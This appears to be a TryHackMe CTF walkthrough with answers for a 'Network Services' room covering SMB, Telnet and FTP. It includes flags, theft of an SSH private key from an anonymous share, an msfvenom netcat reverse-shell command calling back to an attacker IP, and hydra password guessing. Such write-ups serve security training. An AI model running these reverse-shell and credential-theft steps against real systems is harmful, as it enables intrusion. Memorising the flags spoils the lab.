#  TryHackMe - Network Services (Room 015)

## Please try and answer all questions before looking at the answers to test your knowledge :)

<details><summary>Task 1 - Understanding SMB</summary>
<p>

## Task 1.1

### Q: What does SMB stand for?

A: Server Message Block Protocol

## Task 1.2

### Q: What type of protocol is SMB?

A: Response-Request

## Task 1.3

### Q: What do clients connect to servers using?

A: TCP/IP

## Task 1.4

### Q: What systems does Samba run on?

A: Unix

</p>
</details>

<details><summary>Task 2 - Enumerating SMB</summary>
<p>
	
## Task 2.1

### Q: Conduct an __nmap__ scan of your choosing. How many ports are open?

A: 3

![](/Network%20Services/images/nmap.png)

## Task 2.2

### Q: What port is SMB running on?

A: 139/445

## Task 2.3

### Q: Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the WORKGROUP name?

A: WORKGROUP

![](/Network%20Services/images/WORKGROUP.png)


## Task 2.4

### Q: What comes up as the __name__ of the machine?

A: POLOSMB

![](/Network%20Services/images/polosmb.png)

## Task 2.5

### Q: What operating system version is running?

A: 6.1

## Task 2.6

### Q: What share sticks out as something we might want to investigate?

A: profiles

![](/Network%20Services/images/profiles.png)

</p>
</details>

<details><summary>Task 3 - Exploiting SMB</summary>
<p>
	
## Task 3.1

### Q: What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?

A: smbclient //10.10.10.2/secret -U suit -p 445

## Task 3.3

### Q: Let's see if our interesting share has been configured to allow anonymous access - that it does not require authentication to view the files. We can do this easily by:

	* using the username "anonymous"
	* connecting to the share we found during the enumeration stage
	* and not supplying a password

Does the share allow anonymous access? Y/N?

A: Y

![](/Network%20Services/images/smbclient.png)

## Task 3.4

### Q: Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?

A: John Cactus

![](/Network%20Services/images/john.png)

## Task 3.5

### Q: What service has been configured to allow him to work from home?

A: SSH

## Task 3.6

### Q: Okay! Now that we know this, what directory on the share should we look in?

A: .ssh

## Task 3.7

### Q: This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?

A: id_rsa

## Task 3.8

### Q: Download this file to your local machine and change the permissions to 600. Now, use the information you have already gathered to work out the username of the account. Then use the service and key to log-in to the server. What is the smb.txt flag?

A: THM{smb_is_fun_eh?}

![](/Network%20Services/images/ssh.png)

</p>
</details>

<details><summary>Task 4 - Understanding Telnet</summary>
<p>
	
## Task 4.1

### Q: What is Telnet?

<details><summary>Answer</summary>
<p>

A: Application Protocol

</p>
</details>

## Task 4.2 

### Q: What has slowly replaced Telnet?

<details><summary>Answer</summary>
<p>
	
SSH

</p>
</details>

## Task 4.3

### Q: How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?

<details><summary>Answer</summary>
<p>
	
telnet 10.10.10.3 23

</p>
</details>

## Task 4.4

### Q: The lack of what means that all Telnet communication is in plaintext?

<details><summary>Answer</summary>
<p>
	
Encryption

</p>
</details>

</p>
</details>

<details><summary>Task 5 - Enumerating Telnet</summary>
<p>
	
## Task 5.1

### Q: How many ports are open on the target machine?

<details><summary>Answer</summary>
<p>

1

![](/Network%20Services/images/nmap2.png)

</p>
</details>

## Task 5.2

### Q: What port is this?

<details><summary>Answer</summary>
<p>

8012

</p>
</details>

## Task 5.3

### Q: This port is unassigned, but still lists the protocol it is using, what protocol is this?

<details><summary>Answer</summary>
<p>

TCP

</p>
</details>

## Task 5.4

### Q: Now re-run the namp scan without the -p- flag. How many ports show up as open?

<details><summary>Answer</summary>
<p>
	
0

![](/Network%20Services/images/closed.png)

</p>
</details>

## Task 5.5 - no answer needed

### Here, we see that by assigning Telnet to a __non-standard port__ it is not part of the common ports list or top 1000 ports that nmap scans. It is important to try every angle when enumerating as the information you gather here will inform your exploitation stage

## Task 5.6

### Q: Based on the title returned to us, what do we think this port could be used for?

<details><summary>Answer</summary>
<p>
	
A backdoor

![](/Network%20Services/images/backdoor.png)

</p>
</details>

## Task 5.7

### Q: Who could it belong to? Gathering possible usernames is an important step in enumeration?

<details><summary>Answer</summary>
<p>
	
Skidy

</p>
</details>

## Task 5.8 - no answer needed

### Always keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits

</p>
</details>

<details><summary>Task 6 - Exploiting Telnet</summary>
<p>
	
## Task 6.1 - no answer needed

### Okay, let's try and connect to this telnet port

## Task 6.2

### Q: Great! It's an open telnet connection. What welcome message do we receive?

<details><summary>Answer</summary>
<p>
	
SKIDY'S BACKDOOR

![](/Network%20Services/images/skidy.png)

</p>
</details>

## Task 6.3

### Q: Let's try executing some commands. Do we get a returnon any input we enter into the telnet session (Y/N)

<details><summary>Answer</summary>
<p>

N

![](/Network%20Services/images/run.png)

</p>
</details>

## Task 6.4 - no answer needed

### Q: That's strange. Let's check to see if what we are typing is being executed as a system command

## Task 6.5 - no answer needed

### Q: Start a tcpdump listener on your local machine using `sudo tcpdump ip proto \\icmp -i tun0` - this starts a tcpdump listener specifically listening for ICMP traffic which ping operates on

## Task 6.6

### Q: Now, use the command `ping [local tun0 ip] -c 1` through the telnet session to see if we are able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)

<details><summary>Answer</summary>
<p>
	
Y

![](/Network%20Services/images/ping.png)

</p>
</details>

## Task 6.7 - no answer needed

### Q: Great! This means we are able to execute system commands AND that we are able to reach our local machine

## Task 6.8

### Q: We are going to generate a reverse shell payload using msfvenom. This will generate and encode a netcat reverse shell for us. Here's our syntax

	`msfvenom -p cmd/unix/reverse_netcat lhost=10.11.3.112 lport=4444 R`

Flag | Description
------------ | -------------
-p | payload
lhost | our local host IP
lport | the port to listen on
R | export the payload in RAW format

What word does the generated payload start with?

<details><summary>Answer</summary>
<p>
	
mkfifo

![](/Network%20Services/images/mkfifo.png)

</p>
</details>

## Task 6.8

### Q: Perfect. We are nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using

	`nc -vlp [listening port]`

What would the command look like for the listening port we selected?

<details><summary>Answer</summary>
<p>
	
nc -lvp 4444

</p>
</details>

## Task 6.10 - no answer needed

### Q: Great! Now that's running we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully - this will give us a shell on the target machine

## Task 6.11

### Q: Success! What is the contents of flag.txt?

<details><summary>Answer</summary>
<p>
	
THM{y0u_g0t_th3_t3ln3t_fl4g}

![](/Network%20Services/images/telnet_flag.png)

</p>
</details>

</p>
</details>

<details><summary>Task 7 - Understanding FTP</summary>
<p>
	
## Task 7.1

### Q: What communications model does FTP use?

<details><summary>Answer</summary>
<p>
	
client-server	

</p>
</details>	

## Task 7.2

### Q: What is the standard FTP port?

<details><summary>Answer</summary>
<p>
	
21

</p>
</details>

## Task 7.3

### Q: How many modes of FTP connection are there?

<details><summary>Answer</summary>
<p>
	
2	

</p>
</details>

</p>
</details>

<details><summary>Task 8 - Enumerating FTP</summary>
<p>
	
## Task 8.1

### Q: Run an nmap scan. How many ports are open on the target machine?

<details><summary>Answer</summary>
<p>
	
2

</p>
</details>

## Task 8.2

### Q: What port is FTP running on?

<details><summary>Answer</summary>
<p>
	
21

</p>
</details>

## Task 8.3

### Q: What variant of FTP is running on it?

<details><summary>Answer</summary>
<p>
	
vsftpd

![](/Network%20Services/images/vsftpd.png)
	
</p>
</details>

## Task 8.4

### Great! Now that we know that type of FTP server we are dealing with we can check to see if we are able to login anonymously to the FTP server

We can do this by typoing `ftp [IP]` into the console and entering anonymous as the username and no password

What is the name of the file in the anonymous FTP directory?

<details><summary>Answer</summary>
<p>
	
PUBLIC_NOTICE.txt

![](/Network%20Services/images/notice.png)
	
</p>
</details>

## Task 8.5

### Q: What do we think a possible username could be?

<details><summary>Answer</summary>
<p>

mike

![](/Network%20Services/images/notice.png)

</p>
</details>

## Task 8.6 - no answer needed

### Q: Great! Now we have got details about the FTP server and a possible username

</p>
</details>

<details><summary>Task 9 - Exploiting FTP</summary>
<p>
	
## Task 9.1

### Q: What is the password for the user "mike"?

<details><summary>Answer</summary>
<p>
	
password

![](/Network%20Services/images/hydra.png)

</p>
</details>

## Task 9.2 - no answer needed

### Q: Bingo! Now, let's connect to the FTP server as this user using `ftp [IP]` and entering the credentials when prompted

## Task 9.3

### Q: What is ftp.txt?

<details><summary>Answer</summary>
<p>
	
THM{y0u_g0t_th3_ftp_fl4g}

![](/Network%20Services/images/flag.png)

</p>
</details>

</p>
</details>